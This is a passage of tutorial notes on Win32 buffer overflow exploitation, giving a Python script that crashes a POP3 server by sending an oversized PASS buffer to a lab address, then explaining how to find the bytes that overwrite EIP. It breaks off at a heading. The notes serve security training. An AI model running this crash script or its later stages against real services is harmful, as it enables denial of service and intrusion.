# Win32 Buffer Overflow Exploitation

### Replicating the Crash

  - Our first task in the exploitation process is to write a simple script that will replicate our observed crash, without having to run the fuzzer each time.

    ```python
    #!/usr/bin/python
    import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    buffer = 'A' * 2700
    try:
      print "\nSending evil buffer..."
      s.connect(('10.0.0.22',110))
      data = s.recv(1024)
      s.send('USER username' +'\r\n')
      data = s.recv(1024)
      s.send('PASS ' + buffer + '\r\n')
      print "\nDone!."
    except:
      print "Could not connect to POP3!"
    ```
### Controlling EIP

  - Getting control of the EIP register is a crucial step of exploit development.

  - For this reason, it is vital that we locate those
  4 A’s that overwrite our EIP register in the buffer.
  - There are two common ways to do this:

    #### Binary Tree Analysis

      - Instead of 2700 A’s, we send 1350 A'ʹs and 1350 B'ʹs.
      - If EIP is overwritten by B'ʹs, we know the four bytes reside in the second half of the buffer.
      - We then change the 1350 B'ʹs to 675 B'ʹs and 675 C'ʹs, and send the buffer again.
      - If EIP is overwritten by C'ʹs, we know that the four bytes reside in the 2000–2700 byte range.
      - We continue splitting the specific buffer until we reach the exact four bytes that overwrite EIP.
      - Mathematically, this should happen in seven iterations.

    #### Sending a Unique String

      
